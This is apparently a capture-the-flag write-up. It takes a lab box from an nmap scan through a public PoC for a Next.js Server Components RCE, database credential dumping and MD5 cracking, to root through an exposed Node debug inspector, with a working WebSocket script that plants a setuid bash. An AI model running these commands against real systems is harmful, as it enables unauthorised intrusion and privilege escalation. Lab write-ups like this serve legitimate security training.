01

Reconnaissance

Port Scan

nmap -p- --min-rate 5000 -T4 <TARGET_IP>
# Found: port 22 (SSH) and port 3000 (HTTP)

Service Detection

nmap -p 3000 -sV <TARGET_IP>
# Found: Next.js web app

Identify Technology

Opened http://<TARGET_IP>:3000 in browser. Used Wappalyzer to fingerprint the stack — Next.js 15.0.3:

Next.js 15.0.3
Why this matteredFramework version fingerprinting is worth doing even on minimal-looking targets — a single exposed app port is often the entire attack surface on these boxes.
02

Foothold — Framework RCE

Find the CVE

Next.js 15.0.3 is vulnerable to CVE-2025-66478 (RCE via React Server Components).

Clone the PoC

git clone https://github.com/msanft/CVE-2025-55182.git
cd CVE-2025-55182

Confirm RCE

python3 poc.py http://<TARGET_IP>:3000 "id"
# uid=999(node) gid=988(node)

Find the Database

python3 poc.py http://<TARGET_IP>:3000 "ls /opt/reactor-app"
# Found: reactor.db

Dump Credentials

python3 poc.py http://<TARGET_IP>:3000 "strings /opt/reactor-app/reactor.db"
# Found: engineer:<MD5_HASH> (MD5)
Why this matteredMD5 for password storage is still seen often enough that it's worth an automatic cracking attempt any time it turns up — the algorithm's speed makes even a moderate wordlist run practical.
03

Crack Hash → User Flag

Crack the Hash

echo "<MD5_HASH>" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# Result: <CRACKED_PASSWORD>

SSH Login

ssh engineer@<TARGET_IP>
# Password: <CRACKED_PASSWORD>

Get User Flag

cat ~/user.txt
User Flag
04

Privilege Escalation — Root-Owned Debug Inspector

Find Node Inspector

ps aux | grep node
# root running: node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

Forward the Port

# On Kali (new terminal)
ssh -L 9229:127.0.0.1:9229 engineer@<TARGET_IP>

Get WebSocket URL

# In SSH session
curl -s http://127.0.0.1:9229/json/list
# Got: ws://127.0.0.1:9229/<INSPECTOR_UUID>

Setup Exploit Environment

# On Kali
mkdir /tmp/nodeexp && cd /tmp/nodeexp
npm install ws

Execute Code as Root

node -e "
const WebSocket = require('ws');
const ws = new WebSocket('ws://127.0.0.1:9229/<INSPECTOR_UUID>');
ws.on('open', () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: 'process.mainModule.require(\"child_process\").execSync(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\").toString()',
      includeCommandLineAPI: true
    }
  }));
});
ws.on('message', (data) => {
  console.log(data.toString());
  ws.close();
});
"

Get Root Shell

# In SSH session
/tmp/rootbash -p
whoami  # root

Get Root Flag

cat /root/root.txt
Root Flag
Why this matteredA Node debug inspector is equivalent to a remote code execution endpoint by design — it should never be reachable by anything other than the developer who intentionally attached to it, and definitely never left on a production, root-owned process.
